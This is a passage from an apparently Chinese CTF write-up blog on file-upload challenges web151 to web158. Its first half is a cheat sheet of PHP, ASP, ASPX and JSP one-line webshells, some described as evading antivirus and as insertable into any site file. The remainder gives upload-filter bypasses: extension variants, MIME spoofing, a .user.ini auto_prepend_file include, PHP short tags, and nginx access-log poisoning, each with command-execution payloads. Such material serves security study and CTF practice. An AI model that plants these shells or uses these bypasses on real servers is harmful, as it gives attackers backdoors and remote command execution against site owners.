Include)‚ÄùÊâßË°åÊ≠§ËÑöÊú¨;Á≠âÁ≠â„ÄÇÊ≠§Á±ªÈóÆÈ¢ò‰∏çÂú®Ê≠§ÁªÜËø∞„ÄÇ</p></li></ul><h4 id="Â∏∏Áî®ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨"><a href="#Â∏∏Áî®ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨" class="headerlink" title="Â∏∏Áî®ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨"></a>Â∏∏Áî®ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨</h4><pre class="language-php" data-language="php"><code class="language-php">##PHPÔºö<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> phpÁéØÂ¢É>=&lt;5.6ÊâçËÉΩÁî®<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  phpÁéØÂ¢É>=5.6ÊâçËÉΩÁî®<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//ÂÆπÈîô‰ª£Á†Å <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//‰ΩøÁî®Lanker‰∏ÄÂè•ËØùÂÆ¢Êà∑Á´ØÁöÑ‰∏ìÂÆ∂Ê®°ÂºèÊâßË°åÁõ∏ÂÖ≥ÁöÑPHPËØ≠Âè• <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*‰ΩøÁî®Ëøô‰∏™Âêé,‰ΩøÁî®ËèúÂàÄ‰∏ÄÂè•ËØùÂÆ¢Êà∑Á´ØÂú®ÈÖçÁΩÆËøûÊé•ÁöÑÊó∂ÂÄôÂú®"ÈÖçÁΩÆ"‰∏ÄÊ†èËæìÂÖ•*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //ÁªïËøá<span class="token php language-php"><span class="token delimiter important">&lt;?</span>ÈôêÂà∂ÁöÑ‰∏ÄÂè•ËØù<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   ‰∏äÈù¢ËøôÂè•ÊòØÈò≤ÊùÄÈò≤Êâ´ÁöÑÔºÅÁΩë‰∏äÂæàÂ∞ë‰∫∫Áî®ÔºÅÂèØ‰ª•ÊèíÂú®ÁΩëÈ°µ‰ªª‰ΩïASPÊñá‰ª∂ÁöÑÊúÄÂ∫ïÈÉ®‰∏ç‰ºöÂá∫ÈîôÔºåÊØîÂ¶Ç index.aspÈáåÈù¢‰πüÊòØÂèØ‰ª•ÁöÑÔºÅ<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> Âä†‰∫ÜÂà§Êñ≠ÁöÑPHP‰∏ÄÂè•ËØùÔºå‰∏é‰∏äÈù¢ÁöÑASP‰∏ÄÂè•ËØùÁõ∏ÂêåÈÅìÁêÜÔºå‰πüÊòØÂèØ‰ª•ÊèíÂú®‰ªª‰ΩïPHPÊñá‰ª∂ ÁöÑÊúÄÂ∫ïÈÉ®‰∏ç‰ºöÂá∫ÈîôÔºÅ&lt;%execute request(‚Äúclass‚Äù)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (‚Äúclass‚Äù)%>&lt;%execute request(‚Äúclass‚Äù)'&lt;% loop &lt;%:%> Êó†Èò≤‰∏ãËΩΩË°®ÔºåÊúâÈò≤‰∏ãËΩΩË°®ÂèØÂ∞ùËØïÊèíÂÖ•‰ª•‰∏ãËØ≠Âè•Á™ÅÁ†¥ÁöÑ‰∏ÄÂè•ËØù &lt;%eval(request(‚Äú1‚Ä≥)):response.end%> Â§á‰ªΩ‰∏ìÁî®</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSPÔºö&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; Êèê‰∫§ÂÆ¢Êà∑Á´Ø &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;Êèê‰∫§&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],‚Äùunsafe‚Äù);%&gt;&lt;%IfRequest(‚Äú1‚Ä≥)&lt;&gt;‚Äù&quot;ThenExecuteGlobal(Request(‚Äú1‚Ä≥))%&gt; &lt;%execute(request(‚Äú1‚Ä≥))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(‚Äú1‚Ä≥)&lt;&#x2F;script&gt; ‰∏çÁî®&#39;&lt;,&gt;‚ÄòÁöÑasp‰∏ÄÂè•ËØù </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;‚Äùserver‚Äù&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (‚Äúadd6bb58e139be10‚Ä≥);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  ‰∏çÁî®ÂèåÂºïÂè∑ÁöÑ‰∏ÄÂè•ËØù„ÄÇ</code></pre><h4 id="Â∏∏ËßÅÁªïËøáÂßøÂäø"><a href="#Â∏∏ËßÅÁªïËøáÂßøÂäø" class="headerlink" title="Â∏∏ËßÅÁªïËøáÂßøÂäø"></a>Â∏∏ËßÅÁªïËøáÂßøÂäø</h4><h5 id="Â§ßÂÜôÁªïËøá-Êàñ-ÂêåËß£ÊûêÂêéÁºÄÂêçÁªïËøá"><a href="#Â§ßÂÜôÁªïËøá-Êàñ-ÂêåËß£ÊûêÂêéÁºÄÂêçÁªïËøá" class="headerlink" title="Â§ßÂÜôÁªïËøá Êàñ ÂêåËß£ÊûêÂêéÁºÄÂêçÁªïËøá"></a>Â§ßÂÜôÁªïËøá Êàñ ÂêåËß£ÊûêÂêéÁºÄÂêçÁªïËøá</h5><pre class="language-txt" data-language="txt"><code class="language-txt">ÂêåËß£ÊûêÂêçÂêéÁºÄÔºö„ÄÄ„ÄÄPHPÔºö.php .php2 .php3 .php4 .php5 .php6 .php7 .phpÁ©∫Ê†º .phtml .pgif„ÄÄ„ÄÄ„ÄÄ„ÄÄ .shtml .htaccess .phar .inc „ÄÄ„ÄÄASPÔºö.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soap„ÄÄ„ÄÄ„ÄÄ„ÄÄ .vbhtm .vbhtml .asa .cer .shtml„ÄÄ„ÄÄJSPÔºö.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØÁî®ÂêÑÁßçÂßøÂäøÁªïËøáÊúçÂä°Âô®Â§ÑÁêÜÈÄªËæë‰∏ä‰º†Êú®È©¨ÊãøÂà∞WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-JsÂâçÁ´ØÈôêÂà∂"><a href="#web151-JsÂâçÁ´ØÈôêÂà∂" class="headerlink" title="web151(JsÂâçÁ´ØÈôêÂà∂)"></a>web151(JsÂâçÁ´ØÈôêÂà∂)</h4><p>ÂâçÁ´ØÈôêÂà∂‰∫ÜÂè™ËÉΩ‰∏ä‰º†pngÊñá‰ª∂ÔºåÂèØ‰ª•ÊäìÂåÖÂêé‰øÆÊîπÊñá‰ª∂ÂêéÁºÄÂêç</p><p><img src="web151.png" loading="lazy"></p><p>PayloadÔºö</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(‚Äòtac ..&#x2F;flag.php‚Äô);</p></blockquote><h4 id="web152-MIMEÂêéÁ´ØÁªïËøá"><a href="#web152-MIMEÂêéÁ´ØÁªïËøá" class="headerlink" title="web152(MIMEÂêéÁ´ØÁªïËøá)"></a>web152(MIMEÂêéÁ´ØÁªïËøá)</h4><p>ËôΩÁÑ∂ÂêéÁ´ØÁÆÄÂçïÊ£ÄÊµãÔºå‰ΩÜÊòØÂ¶ÇÊûúÁõ¥Êé•‰∏ä‰º†png,ÊäìÂåÖÁöÑÊó∂ÂÄôÂÜçÊîπÂêéÁºÄÔºåÂÖ∂ÂÆû‰∏çÁî®‰øÆÊîπContent-TypeÔºåÊñπÊ≥ïÂêå‰∏ä</p><p><strong>MIME</strong></p><p>MIMEÔºàMultipurpose Internal MailExtensionsÔºâÂ§öÁî®ÈÄî‰∫íËÅîÁΩëÈÇÆ‰ª∂Êâ©Â±ïÁ±ªÂûã„ÄÇ<br>ÊòØËÆæÂÆöÊüêÁßçÊâ©Â±ïÂêçÁöÑÊñá‰ª∂Áî®‰∏ÄÁßçÂ∫îÁî®Á®ãÂ∫èÊù•ÊâìÂºÄÁöÑÊñπÂºèÁ±ªÂûãÔºåÂΩìËØ•Êâ©Â±ïÂêçÊñá‰ª∂Ë¢´ËÆøÈóÆÁöÑÊó∂ÂÄôÔºåÊµèËßàÂô®‰ºöËá™Âä®ÊåáÂÆöÂ∫îÁî®Á®ãÂ∫èÊù•ÊâìÂºÄ„ÄÇÂ§öÁî®‰∫éÊù•ÊåáÂÆö‰∏Ä‰∫õÂÆ¢Êà∑Á´ØËá™ÂÆö‰πâÁöÑÊñá‰ª∂ÂêçÔºå‰ª•Âèä‰∏Ä‰∫õÂ™í‰ΩìÊñá‰ª∂ÊâìÂºÄÊñπÂºè„ÄÇ<br>ÊØè‰∏™MIMEÁ±ªÂûãÁî±‰∏§ÈÉ®ÂàÜÁªÑÊàêÔºåÂâçÈù¢ÊòØÊï∞ÊçÆÁöÑÂ§ßÁ±ªÂûãÔºå‰æãÂ¶ÇÂ£∞Èü≥audioÔºåÂõæÂÉèimageÁ≠âÔºåÂêéÈù¢ÂÆö‰πâÂÖ∑‰ΩìÁöÑÁßçÁ±ª<br><strong>Â∏∏ËßÅÁöÑMIMEÁ±ªÂûãÔºö</strong><br>Ë∂ÖÊñáÊú¨Ê†áËÆ∞ËØ≠Ë®ÄÊñáÊú¨Ôºö.html‚Äî‚Äî&gt;text&#x2F;html<br>xmlÊñáÊ°£Ôºö.xml‚Äî‚Äî&gt;text&#x2F;xml<br>XHTMLÊñáÊ°£Ôºö.xhtml‚Äî‚Äî&gt;application&#x2F;xhtml+xml<br>ÊôÆÈÄöÊñáÊú¨Ôºö.txt‚Äî‚Äî&gt;text&#x2F;plain<br>RTFÊñáÊú¨Ôºö.rtf‚Äî‚Äî&gt;application&#x2F;rtf<br>pngÂõæÁâá:.png‚Äî‚Äî&gt;image&#x2F;png</p><p>ËøôÂ∫îËØ•ÊòØÈ¢ÑÊúüËß£ÔºåÊúâÁÇπÈ∫ªÁÉ¶</p><blockquote><p>‰∏ä‰º†‰∏Ä‰∏™phpÊñá‰ª∂ÔºåÂêåÊó∂Áî®burpÊäìÂåÖÔºåÂ∞Üburp‰∏≠ÁöÑContent-Type:<br>application&#x2F;octet-stream‰øÆÊîπ‰∏∫Content-Type:<br>image&#x2F;pngÔºåÂç≥ËÆ©ÊúçÂä°Âô®ËÆ§‰∏∫Ëøô‰∏™Êñá‰ª∂ÊòØ‰∏Ä‰∏™ÂõæÁâáÊñá‰ª∂ÂéªËß£ÊûêÊâßË°å</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>Â∏∏ËßÑÂßøÂäøÈÉΩËØï‰∫ÜÂèëÁé∞Ê≤°Ê≥ïÁªïËøáÔºåÂèëÁé∞uploadÂèØ‰ª•ËÆøÈóÆÔºåËØ¥ÊòéÈáåÈù¢Âê´ÊúâphpÊñá‰ª∂ÂèØ‰ª•ËÄÉËôë‰ΩøÁî®.user.iniÁªïËøá</p><p><strong>.user.ini</strong></p><ul><li>ÂΩìÂâçÁõÆÂΩïÈáåÈù¢ÊúâphpÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ËøêÁî®iniÈÖçÁΩÆÊñá‰ª∂ËøõË°åÈÖçÁΩÆËøô‰∏™phpÊñá‰ª∂</li><li>ÂíåÊñá‰ª∂ÂåÖÂê´ÊúâÂÖ≥ÁöÑÈÖçÁΩÆÈ°πÊúâauto_append_fileÂíåauto_prepend_file</li></ul><p>ÂéüÁêÜ: ÊåáÂÆö‰∏Ä‰∏™Êñá‰ª∂ÔºàÂ¶Ça.jpgÔºâÔºåÈÇ£‰πàËØ•Êñá‰ª∂Â∞±‰ºöË¢´ÂåÖÂê´Âú®Ë¶ÅÊâßË°åÁöÑphpÊñá‰ª∂‰∏≠ÔºàÂ¶Çindex.phpÔºâÁ±ª</p><p>‰ºº‰∫éÂú®index.php‰∏≠ÊèíÂÖ•‰∏ÄÂè•Ôºörequire(.&#x2F;a.jpg);Ëøô‰∏§‰∏™ËÆæÁΩÆÁöÑÂå∫Âà´Âè™ÊòØÂú®‰∫éauto_prepend_fileÊòØÂú®</p><p>Êñá‰ª∂ÂâçÊèíÂÖ•Ôºõauto_append_fileÂú®Êñá‰ª∂ÊúÄÂêéÊèíÂÖ•ÔºàÂΩìÊñá‰ª∂Ë∞ÉÁî®ÁöÑÊúâexit()Êó∂ËØ•ËÆæÁΩÆÊó†ÊïàÔºâÊâÄ‰ª•Ë¶ÅÊ±ÇÂΩì</p><p>ÂâçÁõÆÂΩïÂøÖÈ°ªË¶ÅÊúâphpÊñá‰ª∂,Â∑ßÂêàÁöÑÊòØËøôÈ¢òuploadÁõÆÂΩï‰∏ãÊúâ‰∏™index.phpÊâÄ‰ª•ËøôÁßçÊñπÂºèÊòØÂèØ‰ª•ÊàêÂäüÁöÑ„ÄÇ</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>ÁÑ∂Âêé‰∏ä‰º†1.txt Ëøô‰∏™1.txtÊú®È©¨Â∞±Ë¢´Ëá™Âä®ÂåÖÂê´ËøõÂéüÊù•ÁõÆÂΩïÈáåÁöÑphpÊñá‰ª∂‰∫ÜÔºà‰∏ÄËà¨ÊòØindex.phpÔºâ</p><p>PayloadÔºö&#x2F;upload?attack&#x3D;system(‚Äòtac ..&#x2F;flag.php‚Äô);</p><h4 id="web154-PHPÁü≠Ê†áÁ≠æ"><a href="#web154-PHPÁü≠Ê†áÁ≠æ" class="headerlink" title="web154(PHPÁü≠Ê†áÁ≠æ)"></a>web154(PHPÁü≠Ê†áÁ≠æ)</h4><p>ÂèëÁé∞‰∏ä‰º†Â§±Ë¥•ÔºåÂ∫îËØ•ÊòØÂØπtxtÊñá‰ª∂ÈáåÁöÑÂÜÖÂÆπÊúâËøáÊª§ÁªèÊ£ÄÊµãÔºåÊü•È™å‰πãÂêéÂèëÁé∞ÊòØÂØπ<code>php</code>Ëøô‰∏â‰∏™Â≠óÊØçËøáÊª§‰∫Ü</p><p>PHPÊ†áÁ≠æÁªïËøáÔºö</p><ul><li><p>ÈïøÊ†áÁ≠æÔºö<?php ?></p></li><li><p>Áü≠Ê†áÁ≠æÔºö<? ?>„ÄÅ<?=  ?>„ÄÅ&lt;%  %&gt;„ÄÅ&lt;%&#x3D;  %&gt;</p></li><li><p>ÂÖ∂‰∏≠ <?  ?> ÈúÄË¶ÅÂºÄÂêØ short_open_tag&#x3D;On Ôºå&lt;%  %&gt; ÈúÄË¶ÅÂºÄÂêØ asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>Ëá™Â∏¶ .user.iniÔºå‰ΩÜ‰∏çÂΩ±ÂìçÔºåpayload ‰∏é web154 ‰∏ÄËá¥</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>ËøáÊª§‰∫Ü<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginxÊñá‰ª∂ÂåÖÂê´"><a href="#web157-nginxÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="web157(nginxÊñá‰ª∂ÂåÖÂê´)"></a>web157(nginxÊñá‰ª∂ÂåÖÂê´)</h4><p>ËøáÊª§‰∫Ü<code>;``&#123;&#125;</code>Ôºå‰ΩÜÊòØ‰∏çÂΩ±ÂìçÔºåÂèØ‰ª•Áõ¥Êé•Âú®1.txtÈáåÈù¢ÊâßË°åÂëΩ‰ª§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>ÂÖ∂‰ªñÔºö</p><p>Áî±‰∫éÊàë‰ª¨ $_POST[] Âè™‰ΩøÁî®‰∏Ä‰∏™ÂèÇÊï∞Âπ∂‰∏î‰∏∫Êï∞ÁªÑÊ†ºÂºèÔºåËÄÉËôë‰ΩøÁî® array_pop() ÂºπÂá∫ÊúÄÂêé‰∏Ä‰∏™ÂçïÂÖÉ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>Áî±web158ÁöÑÈªëÂêçÂçïÂæóÊù•Ôºå#nginx ÁöÑÊó•Âøó‰ºöËé∑Âèñ UAÂ§¥ ‰ø°ÊÅØ#bp ÊäìÂåÖ,Âú® UAÂ§¥ ËøõË°åÊ≥®ÂÖ•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>ban‰∫ÜlogÔºåÂèØÊîπ‰∏∫</p><pre class="language-php" 